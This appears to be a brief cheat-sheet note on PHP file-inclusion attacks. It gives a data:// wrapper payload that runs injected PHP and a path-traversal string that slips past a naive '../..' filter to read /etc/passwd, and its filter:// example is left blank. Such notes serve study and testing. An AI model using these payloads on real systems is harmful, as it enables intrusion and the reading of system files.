
PHP has 2 built in data wrappers which can be exploited. 

filter://
example: 

data:// : allows for in-line data embedding
example: `data:text/plain,<?php%20phpinfo();%20?>`
decoded payload: `data:text/plain,<?php phpinfo(); ?>`



```php
if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```
Payload to bypass the above PHP code: `/var/www/html/..//..//..//etc/passwd`


